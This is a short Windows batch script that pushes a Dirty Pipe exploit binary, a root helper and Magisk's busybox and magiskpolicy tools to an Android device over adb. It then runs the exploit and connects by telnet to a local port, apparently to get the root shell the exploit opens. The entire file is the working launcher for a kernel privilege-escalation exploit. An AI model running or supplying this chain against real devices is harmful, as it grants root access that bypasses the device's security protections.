@echo off

set dir=/data/local/tmp
set adb=adb -d

%adb% push dirtypipe-android startup-root magisk/busybox magisk/magiskpolicy %dir%
%adb% shell chmod 755 %dir%/dirtypipe-android %dir%/startup-root %dir%/busybox %dir%/magiskpolicy
%adb% shell %dir%/dirtypipe-android
%adb% shell sleep 1
%adb% shell %dir%/busybox telnet 127.0.0.1 10847

pause

